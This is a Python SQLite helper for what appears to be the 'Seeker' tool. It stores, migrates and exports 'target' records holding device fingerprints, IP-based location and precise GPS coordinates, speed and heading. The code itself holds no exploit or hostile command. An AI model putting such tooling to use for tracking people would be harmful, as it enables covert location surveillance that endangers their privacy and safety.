#!/usr/bin/env python3
"""
SQLite Database Manager for Seeker Telemetry
Stores client telemetry, network recon, and GPS coordinates into db/seeker.db
"""

import os
import sqlite3
import csv
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_DIR = os.path.join(BASE_DIR, 'db')
DB_FILE = os.path.join(DB_DIR, 'seeker.db')
CSV_FILE = os.path.join(DB_DIR, 'results.csv')


def clean_num(val):
    if val is None:
        return None
    s = str(val).replace(' deg', '').replace(' m', '').strip()
    if s in ('Not Available', 'N/A', 'null', 'undefined', ''):
        return None
    try:
        return float(s)
    except ValueError:
        return None


def get_db_connection():
    if not os.path.isdir(DB_DIR):
        os.makedirs(DB_DIR, exist_ok=True)
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            os TEXT,
            platform TEXT,
            cores TEXT,
            ram TEXT,
            vendor TEXT,
            render TEXT,
            resolution TEXT,
            browser TEXT,
            ip TEXT,
            continent TEXT,
            country TEXT,
            region TEXT,
            city TEXT,
            org TEXT,
            isp TEXT,
            lat REAL,
            lon REAL,
            accuracy REAL,
            altitude REAL,
            direction REAL,
            speed REAL
        )
    ''')
    conn.commit()

    # Check if empty, and migrate from results.csv if exists
    cursor.execute('SELECT COUNT(*) FROM targets')
    count = cursor.fetchone()[0]
    if count == 0 and os.path.exists(CSV_FILE):
        migrate_from_csv(conn)

    conn.close()


def migrate_from_csv(conn):
    if not os.path.exists(CSV_FILE):
        return

    cursor = conn.cursor()
    try:
        with open(CSV_FILE, 'r', encoding='utf-8', errors='replace') as f:
            reader = csv.reader(f)
            for row in reader:
                if not row or len(row) == 0:
                    continue

                item = {
                    "os": row[0] if len(row) > 0 else "N/A",
                    "platform": row[1] if len(row) > 1 else "N/A",
                    "cores": row[2] if len(row) > 2 else "N/A",
                    "ram": row[3] if len(row) > 3 else "N/A",
                    "vendor": row[4] if len(row) > 4 else "N/A",
                    "render": row[5] if len(row) > 5 else "N/A",
                    "resolution": row[6] if len(row) > 6 else "N/A",
                    "browser": row[7] if len(row) > 7 else "N/A",
                    "ip": row[8] if len(row) > 8 else "N/A",
                    "continent": "N/A",
                    "country": "N/A",
                    "region": "N/A",
                    "city": "N/A",
                    "org": "N/A",
                    "isp": "N/A",
                    "lat": None,
                    "lon": None,
                    "accuracy": None,
                    "altitude": None,
                    "direction": None,
                    "speed": None,
                }

                if len(row) >= 15:
                    if clean_num(row[9]) is not None:
                        item["lat"] = clean_num(row[9])
                        item["lon"] = clean_num(row[10])
                        item["accuracy"] = clean_num(row[11]) if len(row) > 11 else None
                        item["altitude"] = clean_num(row[12]) if len(row) > 12 else None
                        item["direction"] = clean_num(row[13]) if len(row) > 13 else None
                        item["speed"] = clean_num(row[14]) if len(row) > 14 else None
                    else:
                        item["continent"] = row[9]
                        item["country"] = row[10]
                        item["region"] = row[11]
                        item["city"] = row[12]
                        item["org"] = row[13]
                        item["isp"] = row[14]

                        if len(row) >= 21:
                            item["lat"] = clean_num(row[15])
                            item["lon"] = clean_num(row[16])
                            item["accuracy"] = clean_num(row[17]) if len(row) > 17 else None
                            item["altitude"] = clean_num(row[18]) if len(row) > 18 else None
                            item["direction"] = clean_num(row[19]) if len(row) > 19 else None
                            item["speed"] = clean_num(row[20]) if len(row) > 20 else None

                cursor.execute('''
                    INSERT INTO targets (
                        os, platform, cores, ram, vendor, render, resolution,
                        browser, ip, continent, country, region, city, org, isp,
                        lat, lon, accuracy, altitude, direction, speed
                    ) VALUES (
                        :os, :platform, :cores, :ram, :vendor, :render, :resolution,
                        :browser, :ip, :continent, :country, :region, :city, :org, :isp,
                        :lat, :lon, :accuracy, :altitude, :direction, :speed
                    )
                ''', item)
        conn.commit()
    except Exception as e:
        print(f"[!] Migration from CSV failed: {e}")


def insert_target(item):
    init_db()
    conn = get_db_connection()
    cursor = conn.cursor()

    # Normalize fields
    record = {
        "os": str(item.get("os", "N/A")),
        "platform": str(item.get("platform", "N/A")),
        "cores": str(item.get("cores", "N/A")),
        "ram": str(item.get("ram", "N/A")),
        "vendor": str(item.get("vendor", "N/A")),
        "render": str(item.get("render", "N/A")),
        "resolution": str(item.get("resolution", item.get("wd", "") + "x" + item.get("ht", ""))).strip("x") or "N/A",
        "browser": str(item.get("browser", "N/A")),
        "ip": str(item.get("ip", "N/A")),
        "continent": str(item.get("continent", "N/A")),
        "country": str(item.get("country", "N/A")),
        "region": str(item.get("region", "N/A")),
        "city": str(item.get("city", "N/A")),
        "org": str(item.get("org", "N/A")),
        "isp": str(item.get("isp", "N/A")),
        "lat": clean_num(item.get("lat")),
        "lon": clean_num(item.get("lon")),
        "accuracy": clean_num(item.get("accuracy", item.get("acc"))),
        "altitude": clean_num(item.get("altitude", item.get("alt"))),
        "direction": clean_num(item.get("direction", item.get("dir"))),
        "speed": clean_num(item.get("speed", item.get("spd"))),
    }

    cursor.execute('''
        INSERT INTO targets (
            os, platform, cores, ram, vendor, render, resolution,
            browser, ip, continent, country, region, city, org, isp,
            lat, lon, accuracy, altitude, direction, speed
        ) VALUES (
            :os, :platform, :cores, :ram, :vendor, :render, :resolution,
            :browser, :ip, :continent, :country, :region, :city, :org, :isp,
            :lat, :lon, :accuracy, :altitude, :direction, :speed
        )
    ''', record)
    conn.commit()
    target_id = cursor.lastrowid
    conn.close()
    return target_id


def get_all_targets():
    init_db()
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM targets ORDER BY id ASC')
    rows = cursor.fetchall()
    targets = []
    for r in rows:
        targets.append(dict(r))
    conn.close()
    return targets


def clear_db():
    init_db()
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Backup current DB to seeker.db.bak
    if os.path.exists(DB_FILE):
        bak_file = DB_FILE + '.bak'
        try:
            import shutil
            shutil.copy2(DB_FILE, bak_file)
        except Exception:
            pass

    cursor.execute('DELETE FROM targets')
    cursor.execute('DELETE FROM sqlite_sequence WHERE name="targets"')
    conn.commit()
    conn.close()


def export_csv_data():
    targets = get_all_targets()
    import io
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Header
    writer.writerow([
        "id", "timestamp", "os", "platform", "cores", "ram", "vendor", "render",
        "resolution", "browser", "ip", "continent", "country", "region", "city",
        "org", "isp", "lat", "lon", "accuracy", "altitude", "direction", "speed"
    ])
    
    for t in targets:
        writer.writerow([
            t.get("id"), t.get("timestamp"), t.get("os"), t.get("platform"),
            t.get("cores"), t.get("ram"), t.get("vendor"), t.get("render"),
            t.get("resolution"), t.get("browser"), t.get("ip"), t.get("continent"),
            t.get("country"), t.get("region"), t.get("city"), t.get("org"),
            t.get("isp"), t.get("lat"), t.get("lon"), t.get("accuracy"),
            t.get("altitude"), t.get("direction"), t.get("speed")
        ])
    return output.getvalue()


if __name__ == '__main__':
    init_db()
    targets = get_all_targets()
    print(f"[*] SQLite initialized. Loaded {len(targets)} targets from {DB_FILE}")
